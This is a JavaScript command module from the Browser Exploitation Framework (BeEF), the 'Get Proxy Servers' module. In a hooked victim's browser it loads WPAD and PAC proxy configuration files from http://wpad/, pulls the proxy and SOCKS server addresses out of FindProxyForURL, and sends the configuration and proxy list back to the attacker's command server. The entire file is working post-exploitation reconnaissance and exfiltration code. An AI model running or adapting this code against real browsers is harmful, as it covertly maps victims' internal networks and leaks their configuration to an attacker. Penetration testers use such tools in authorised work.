//
// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  load_script = function(url) {
    beef.debug("[Get Proxy Servers] Loading: " + url);
    var s = document.createElement("script");
    s.type = 'text/javascript';
    s.src  = url;
    document.body.appendChild(s);
  }

  read_wpad = function() {
    if (typeof FindProxyForURL === 'function') {
      var wpad = FindProxyForURL.toString();
      beef.debug("[Get Proxy Servers] Success: Found wpad (" + wpad.length + ' bytes)');
      beef.net.send("<%= @command_url %>", <%= @command_id %>, "has_wpad=true&wpad="+wpad, beef.are.status_success());
    } else {
      beef.debug("[Get Proxy Servers] Error: Did not find wpad");
      beef.net.send("<%= @command_url %>", <%= @command_id %>, "has_wpad=false");
      return;
    }
    var proxies = [];
    var proxyRe = /PROXY\s+[a-zA-Z0-9\.\-_]+:[0-9]{1,5}/g;
    while (match = proxyRe.exec(wpad)) {
      proxies.push(match[0]);
    }
    var proxyRe = /SOCKS\s+[a-zA-Z0-9\.\-_]+:[0-9]{1,5}/g;
    while (match = proxyRe.exec(wpad)) {
      proxies.push(match[0]);
    }
    if (proxies.length == 0) {
      beef.debug("[Get Proxy Servers] Found no proxies");
      return;
    }
    beef.debug("[Get Proxy Servers] Found "+proxies.length+" proxies: " + proxies.join(','));
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "proxies=" + proxies.join(','), beef.are.status_success());
  }

  load_script("http://wpad/wpad.dat");
  load_script("http://wpad/wpad.pac");

  load_script("http://wpad/proxy.dat");
  load_script("http://wpad/proxy.pac");

  setTimeout("read_wpad()", 10000);

});

